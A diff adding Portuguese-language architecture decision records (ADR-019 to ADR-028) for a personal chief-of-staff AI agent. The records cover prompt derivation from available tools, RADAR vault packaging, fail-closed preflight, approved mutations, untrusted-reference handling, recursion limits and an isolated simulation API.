+        <pre><code>settings → _available_tools() ─┬→ create_deep_agent(tools=…)
+                              ├→ build_system_prompt(names)
+                              └→ build_domain_subagents(…, tools)</code></pre>
+        <p><strong>Por que derivar o prompt, e não apenas gatear as tools:</strong> o modelo responde ao usuário a partir do que o prompt prometeu, não a partir do que a superfície permite. Um parágrafo descrevendo <code>search_tasks</code> numa instalação sem Notion produz a pior das respostas possíveis — o assistente oferece consultar o board, chama uma tool que não existe, e relata a ausência da capacidade como "não encontrei nenhuma tarefa". Ausência de integração e resultado vazio são a mesma frase para o usuário, e só uma delas é verdade. Derivar dos nomes publicados torna essa divergência estruturalmente impossível em vez de meramente desaconselhada, e é a mesma tese da <a href="#adr-005">ADR-005</a> aplicada ao texto: o que vale é o que a aplicação decide, não o que o modelo herdou.</p>
+        <p><strong>Consequências em cascata, todas na mesma direção:</strong> um domínio sem tools não compila subagente — um filho que responde "não encontrei nada" a todo briefing é lido pelo Chief como resultado, não como capacidade ausente. <code>task_digest</code> é recusado na criação, dentro da conversa onde o usuário ainda pode ouvir a recusa, em vez de falhar às três da manhã sem ninguém olhando. A numeração das regras é gerada, não escrita, para que uma regra retirada não deixe buraco entre "3." e "5.". E <code>reference_library_configured()</code> passa a exigir <code>notion_configured</code>: um id esquecido no <code>.env</code> não ressuscita <code>save_reference</code> sozinho.</p>
+        <p><strong>O que a decisão não faz:</strong> não apaga nada. Nenhuma migration, nenhuma tabela, nenhum módulo — <code>app/integrations/notion_client.py</code>, os services e o fallback MCP continuam no repositório, testados, e voltam inteiros quando a flag volta. Os scripts operacionais (<code>scripts/notion_schema.py</code>, <code>scripts/test_notion.py</code>) constroem o cliente direto e por isso continuam funcionando com a flag desligada, que é exatamente o que se precisa para conferir o workspace <em>antes</em> de ligá-la.</p>
+        <p><strong>Alternativas descartadas:</strong> remover o Notion do repositório entregaria um esqueleto mais limpo e destruiria o único exemplo completo de uma integração com proveniência, aprovação e fallback — o material de referência para as próximas conexões. Manter o prompt constante e apenas gatear as tools custaria menos trabalho e preservaria o defeito que motivou a ADR. Um segundo prompt escrito à mão para a instalação sem Notion duplicaria trezentas linhas que passariam a divergir na primeira edição.</p>
+
+        <h2 id="adr-020">ADR-020 · RADAR entra como pacote versionado e ABox em volume, antes de receber tools</h2>
+        <p><strong>Problema concreto:</strong> o runtime, a TBox e a ABox RADAR existiam no repositório irmão. Importar por caminho local ou copiar seus YAMLs faria o Personal-CoS depender do layout do Mac e criaria uma segunda fonte normativa. Publicar leitura imediatamente misturaria defeitos de distribuição, identidade, schema e volume com comportamento do agente.</p>
+        <p><strong>Decisão:</strong> instalar <code>radar-vault 0.2.0</code> do repositório privado pelo SHA completo associado à tag <code>v0.2.0</code>. O build recebe um token GitHub read-only somente como secret BuildKit e remove Git do runtime. Core, regras e políticas vêm somente da API pública do pacote. A ABox fica fora da imagem, montada em <code>/data/radar-vault</code>. A Fase 1 criou configuração, Principal confiável, factory/lifecycle e preflight. A Fase 2 publica apenas cinco consultas projetadas quando esse preflight está <code>ready</code>.</p>
+        <pre><code>release imutável → pacote + TBox
+volume persistente → ABox + .radar/
+Settings + Telegram autorizado → Principal
+                         ↓
+                  ready ou degraded
+                         ↓
+                  Fase 2: cinco leituras projetadas</code></pre>
+        <p><strong>Fail-closed:</strong> a integração só chega a <code>ready</code> quando configuração, TBox, schema legível, estrutura, contrato do runtime, pessoa/contexto e permissão de auditoria são válidos. Qualquer falha vira um código seguro em <code>radar.preflight.degraded</code>; exceção, path, título e frontmatter não são registrados. A API e as outras integrações continuam disponíveis.</p>
+        <p><strong>Identidade e leitura:</strong> o service deriva <code>Principal.id</code> do <code>TELEGRAM_ALLOWED_USER_ID</code> e usa o <code>RADAR_PERSON_ID</code> configurado no mesmo contexto. Grants e autonomia começam vazios. O modelo não recebe parâmetros capazes de mudar essa autoridade ou de escolher <code>context</code>. Resultados passam por DTOs limitados; paths, histórico, descrição/evidência no audit e frontmatter arbitrário não entram no trace persistido.</p>
+        <p><strong>Alternativas descartadas:</strong> <code>PYTHONPATH</code> externo quebraria Docker; copiar a TBox envelheceria em paralelo; uma API HTTP RADAR adicionaria rede e autenticação sem consumidor remoto; montar o vault no build vazaria dados no artefato; começar pelas tools tornaria startup incompatível indistinguível de consulta vazia.</p>
+        <p><strong>Trade-off:</strong> um snapshot por commit exige atualização deliberada e o volume exige backup, restore e ownership operacionais. Cinco tools específicas exigem ampliar uma a uma quando surgir uma pergunta nova, mas impedem consulta genérica e preservam um limite revisável. Detalhes em <a href="../development/029-radar-read-tools.html">029 · Consultas RADAR</a>.</p>
+
+        <h2 id="adr-021">ADR-021 · Perguntas gerenciais viram consultas compostas, não um subagente</h2>
+        <p><strong>Problema concreto:</strong> as cinco leituras fundamentais da Fase 2 são seguras, mas perguntas diárias ainda deixavam a composição para o modelo. Identificar riscos e mitigações, comparar prazos/revisões, ligar decisões a evidências e reunir compromissos são operações repetíveis. A pergunta de riscos, por exemplo, precisava de busca, contexto genérico e seleção de relações antes da resposta.</p>
+        <p><strong>Decisão:</strong> publicar no Chief cinco novas tools read-only: <code>radar_get_risk_report</code>, <code>radar_list_action_attention</code>, <code>radar_get_decision_evidence</code>, <code>radar_get_person_commitments</code> e <code>radar_get_management_context</code>. O <code>RadarService</code> executa travessias de até dois saltos, cálculo de datas e associação de termos; schemas preservam limites e não expõem contexto, Principal, grant, path ou operação.</p>
+        <pre><code>busca identifica id
+        ↓
+uma tool composta no Chief
+        ↓
+service calcula e projeta
+        ↓
+DTO limitado + truncated</code></pre>
+        <p><strong>Por que não um <em>management-agent</em>:</strong> a referência de orquestração recomenda subagente quando há contexto especializado, planejamento multi-etapas ou isolamento útil. Nenhum desses sinais apareceu aqui: os dados vêm de um domínio, cada cenário agora cabe em uma chamada depois do id e o Chief já possui a identidade confiável. Um filho adicionaria briefing, relatório e trace indireto sem reduzir autoridade nem complexidade. A decisão será reaberta somente se conversas reais mostrarem encadeamentos recorrentes ou cruzamento de domínios.</p>
+        <p><strong>Auditoria e read-only:</strong> o repository persiste somente ids, tipos, status, revisões, datas, motivos, contagens e flags. Título, descrição, body, decisão, racional e evidência livre não entram no trace. As consultas não alteram Markdown, embora o runtime acrescente eventos em <code>.radar/audit</code>. A fila de atenção escaneia no máximo 100 ações e pode gerar uma leitura auditada por ação porque o pacote não oferece detalhe em lote.</p>
+        <p><strong>Validação:</strong> <code>radar_validate_context</code> continua sendo a sexta pergunta da fase. <em>Finding</em>, warning e error permanecem categorias distintas; um finding não é tratado automaticamente como corrupção. A projeção aceita os códigos normativos mistos, como <code>RADAR-M001</code>, e continua omitindo a prosa do validador.</p>
+        <p><strong>Trade-off e aceite:</strong> a superfície cresce de cinco para dez leituras e cada nova pergunta ainda exige contrato próprio. Em troca, o resultado é determinístico e testável, sem linguagem genérica de consulta. O deployment e os testes operacionais concluíram os aceites técnico e de produto; o relatório de traces permanece para acompanhar regressões e orientar a Fase 4. Detalhes em <a href="../development/030-radar-management-queries.html">030 · Consultas gerenciais RADAR</a>.</p>
+
+        <h2 id="adr-022">ADR-022 · Aprovação RADAR executa comando persistido, não mensagem reconstruída</h2>
+        <p><strong>Problema concreto:</strong> uma alteração RADAR precisa sobreviver ao intervalo entre pedido e confirmação sem aceitar contexto, grant, revisão ou texto reescrito por um modelo. A aprovação genérica existente reexecuta a solicitação por LLM e por isso não tem essa propriedade.</p>
+        <p><strong>Decisão:</strong> preparar cada operação publicamente no pacote sem efeitos, salvar seu payload normalizado, revisão, expiração e chave de idempotência em <code>pending_radar_operations</code>, e executar esse registro somente depois do claim atômico de um “sim” autenticado. O Principal é reconstruído e reautorizado no instante da execução.</p>
+        <p><strong>Consequências:</strong> “não” não chama runtime nem modelo; conflito de revisão é terminal e não re-prepara; resposta incerta só pode reconciliar o mesmo payload com a mesma chave. O índice parcial limita pending/executing/uncertain a uma thread. Scheduler e subagentes ficam sem essa superfície. Detalhes em <a href="../development/031-radar-approved-mutations.html">031 · Mutações RADAR aprovadas</a>.</p>
+
+        <h2 id="adr-023">ADR-023 · Identidade canônica não é linguagem de conversa nem autoridade implícita</h2>
+        <p><strong>Problema concreto:</strong> IDs, revisões e símbolos RADAR ajudavam o modelo, mas tornavam a conversa difícil de reconhecer e responder. Ocultá-los apenas no prompt não resolveria continuidade nem segurança: o modelo poderia escolher um item de uma busca ambígua, lê-lo e usar essa leitura como proveniência de escrita.</p>
+        <p><strong>Decisão de apresentação:</strong> a aplicação traduz vocabulário e substitui identidade técnica por título/nome, salvo pedido técnico explícito. Ambiguidade vira uma lista numerada com tipo e estado; itens ainda indistinguíveis pedem responsável, prazo ou contexto, sem sufixo de ID. Uma thread mantém somente uma lista numérica entre RADAR e Notion.</p>
+        <p><strong>Decisão de autoridade:</strong> mutação aceita somente busca única, escolha persistida pela aplicação ou ID digitado pelo usuário no turno atual. Uma leitura escolhida pelo modelo após busca ambígua e as referências de conversa nunca autorizam escrita. Alvo, executor e evidência são validados por papel e tipo.</p>
+        <p><strong>Continuidade e confiança:</strong> referências confirmadas têm TTL e entram como resultado de tool não confiável, sem interpolação de ABox em mensagem de sistema. Fatos atuais exigem releitura. Perguntas e recibos vêm do snapshot persistido; delegação é descrita como proposta aguardando aceite.</p>
+        <p><strong>Trade-off:</strong> o pacote 0.3.0 não normaliza diacríticos. O host complementa a busca com uma varredura autorizada de até 100 resumos; isso gera uma observação extra e deixa uma correção futura no pacote. Detalhes em <a href="../development/032-radar-human-interaction.html">032 · Interação humana com o RADAR</a>.</p>
+
+        <h2 id="adr-024">ADR-024 · Consultas avançadas reduzem rodadas antes de elevar limites</h2>
+        <p><strong>Problema concreto:</strong> T04, T10 e T12 esgotaram o limite de recursão do LangGraph ao procurar pessoas, riscos, decisões e indicadores um por vez. Apenas elevar o limite aumentaria custo e adiaria a mesma falha; deixar cada composição no prompt manteria o comportamento não determinístico.</p>
+        <p><strong>Decisão:</strong> publicar <code>radar_resolve_entities</code>, que agrupa até oito referências sem escolher candidatos, e <code>radar_get_operational_brief</code>, que faz uma leitura de grafo e classifica a visão de uma âncora. Depois disso o teto de passos passa de 25 para 50, acompanhado de middleware independente: no máximo 16 tools e duas chamadas com o mesmo nome e argumentos.</p>
+        <pre><code>mensagem multifato
+  → lote/briefing limitado
+  → menos turnos modelo-tool
+  → orçamento independente
+  → métricas sem prosa</code></pre>
+        <p><strong>Auditoria:</strong> cada <code>AgentRun</code> registra passos, totais, chamadas RADAR, hashes de argumentos repetidos e causa terminal. <code>GraphRecursionError</code> vira <code>agent_step_limit</code>; a resposta pública explica que o pedido deve ser dividido, sem atribuir a falha aos dados ou afirmar alteração.</p>
+        <p><strong>Trade-off:</strong> o batch ainda faz observações internas limitadas porque o pacote não tem busca pública multi-referência. Ele continua sendo uma única tool do ponto de vista do agente e nunca concede proveniência de escrita. A homologação com provider real permanece necessária antes de concluir a qualidade da resposta. Detalhes em <a href="../development/037-radar-advanced-query-resilience.html">037 · Resiliência das consultas avançadas</a>.</p>
+
+        <h2 id="adr-025">ADR-025 · ABox sincronizada entra por promoção validada, não por escrita no ativo</h2>
+        <p><strong>Problema concreto:</strong> o preflight validava a ABox apenas no startup. Obsidian Sync, seed ou restore podiam alterar o mount depois disso, introduzir IDs duplicados e deixar o runtime anunciando <code>ready</code> até uma consulta falhar genericamente.</p>
+        <p><strong>Decisão de runtime:</strong> cada instância guarda uma geração baseada no manifest das notas. Antes de observar, preparar ou executar, mudança de geração dispara o <code>Vault.validate()</code> normativo e reaplica schema, identidade e contexto. Erro muda o estado para <code>degraded</code>, bloqueia reads/writes e publica somente <code>vault_changed_invalid</code> e contagens.</p>
+        <p><strong>Decisão operacional:</strong> Obsidian Headless escreve somente em staging. Com <em>Fully Synced</em> e o agente parado, a CLI copia um snapshot estável, rejeita symlinks, valida o candidate, incorpora o estado <code>.radar</code> ativo, cria backup completo e promove por rename no mesmo filesystem. Restore percorre o mesmo gate. Nenhum fluxo renumera IDs automaticamente.</p>
+        <pre><code>Sync → staging → snapshot → validate
+                            ├─ falha → ativo intacto
+                            └─ passa → backup ABox + .radar → promote → reload</code></pre>
+        <p><strong>Saída segura:</strong> CLI, health e logs recebem apenas status, códigos enumerados, versões e contagens. Paths, títulos, IDs e mensagens de validação não cruzam o limite. A conversa aplica a mesma tese: nomes internos da superfície são removidos por código, não apenas por prompt.</p>
+        <p><strong>Trade-off:</strong> promoção exige espaço para candidate e backup, downtime curto e operação explícita. Em troca, sincronização parcial nunca vira a fonte viva e rollback preserva auditoria, receipts e journals. Detalhes em <a href="../development/039-radar-public-language-integrity.html">039 · Linguagem pública e integridade RADAR</a>.</p>
+
+        <h2 id="adr-026">ADR-026 · API sintética isolada para o cos-mariana</h2>
+        <p><strong>Problema concreto:</strong> o simulador já possui um cliente HTTP RADAR, mas o Personal-CoS só aceitava Telegram. Reutilizar diretamente a rota Telegram exigiria inventar updates e enviaria respostas ao chat real. Reutilizar o agente principal permitiria que cenários hipotéticos criassem tarefas, drafts ou lembretes de verdade.</p>
+        <p><strong>Decisão:</strong> implementar o contrato `/v1/threads` em uma interface separada. Um segredo Bearer compartilhado com pelo menos 32 caracteres autentica criação e consulta; o `Idempotency-Key`, o id da mensagem e o hash do payload são persistidos antes da inferência. Cada sessão ganha thread e auditoria próprias. O agente de simulação não recebe tools, subagentes, memória, workspace nem integração pessoal.</p>
+        <pre><code>cos-mariana → Bearer → API RADAR
+                         ↓ identidade vinculada à sessão
+                  agent sem tools
+                         ↓ resposta confirmada
+                  histórico + run + ledger</code></pre>
+        <p><strong>Falhas e duplicidade:</strong> uma resposta concluída é repetida literalmente em novo POST ou no endpoint de status. Uma mensagem ainda em processamento não inicia outro run. Depois de cinco minutos sem conclusão, seu estado passa a <code>unknown</code>; o código não reexecuta a inferência por conta própria. Isso protege contra execução duplicada e conserva a diferença entre falha e resultado conhecido.</p>
+        <p><strong>Alternativas descartadas:</strong> usar o webhook Telegram misturaria protocolo e identidade; chamar <code>process_telegram_update</code> acoplaria o teste ao envio para o chat real; publicar tools read-only ainda exporia tarefas, agenda ou e-mail pessoais a conteúdo sintético. O modo de simulação responde com aconselhamento textual e sem acesso aos sistemas reais.</p>
+        <p><strong>Trade-off:</strong> essa interface não mede o comportamento do agente operacional completo; ela mede uma resposta textual do modelo isolada. O smoke de uma mensagem é opt-in porque chama um modelo real e cria uma sessão persistente. A compatibilidade com o deployment só é confirmada depois de configurar o mesmo `RADAR_API_KEY` nos dois projetos e executar o smoke. Detalhes em <a href="../development/028-radar-api-connection.html">028 · API RADAR para cos-mariana</a>.</p>
+
+        <h2>Como revisar uma decisão</h2>
+        <ol>
+          <li>Registrar o problema concreto que tornou a decisão insuficiente.</li>
+          <li>Atualizar o teste de contrato antes ou junto da implementação.</li>
+          <li>Explicar a nova alternativa e seus trade-offs.</li>
+          <li>Atualizar as páginas de desenvolvimento afetadas e o <code>TASK_LIST.md</code>.</li>
+        </ol>
+      </section>
+
+        <h2 id="adr-027">ADR-027 · O domínio RADAR entra no JMR por patch de três vias e pacote pinado</h2>
+        <p><strong>Problema concreto:</strong> o <code>JMR_Personal-CoS</code> é a linha de uso real e precisava operar o vault RADAR, que só existia no <code>RADAR-CoS-v1</code>. Os dois descendem do mesmo template.</p>
+        <p><strong>Decisão:</strong> reaplicar sobre o JMR a diferença entre o template (<code>b8d89be</code>) e o <code>RADAR-CoS-v1</code> (<code>cdf1ef9</code>) com <code>git apply --3way</code>, resolver os nove conflitos à mão e instalar <code>radar-vault</code> do <code>JMR_RADAR_ONTOLOGY</code> no commit <code>5f85264</code> (0.5.0), com o token do GitHub apenas como secret de build. O pino inicial foi o <code>405aab8</code> (0.4.0), trocado ao validar o vault real, escrito pelo 0.5.0.</p>
+        <p><strong>Alternativas descartadas:</strong> duplicar o <code>RADAR-CoS-v1</code> criaria uma terceira linha de código; copiar arquivos perderia a rastreabilidade; apontar para a branch <code>main</code> deixaria o build mudar sem aviso; o 0.4.0 rejeita o vault real (relations com <code>target_id</code> e nomes de arquivo humanos).</p>
+        <p><strong>Trade-off:</strong> JMR e RADAR-CoS-v1 passam a divergir e correções precisam ser portadas de propósito. O RADAR-CoS-v1 continua no 0.4.0.</p>
+      <section id="adr-028"><h2>ADR-028 · Runtime de produto com contexto autorizado</h2><p>04/10/2026 · COS_AGENT_V2 hospeda DeepAgentsAdapter; Plane conserva sessão, escopo e commands. O contrato de execução é independente da API de simulação e dos DTOs do harness. O executor inicial só analisa um snapshot limitado.</p><p>A pausa é cooperativa e o resultado concluído permanece salvo para retomada sem LLM. Um worker perdido vira unknown ao expirar o lease e não é repetido automaticamente. Eventos SSE persistidos são entregues em lotes com cursor. Essa escolha atende ao primeiro slice sem checkpoint genérico ou broker adicional. A próxima skill usará a aprovação já existente no Command Layer.</p><p><a href="../development/043-radar-agent-runtime.html">Implementação, testes e configuração</a></p></section>
+      <p class="footer">Decisões revisadas em 01/10/2026: integração RADAR portada ao JMR_Personal-CoS (ADR-020 a 025) API sintética do M10 renumerada como ADR-026 e ADR-027 sobre a forma da integração.</p>
+    </main>
+  </div>
+</body>
+</html>
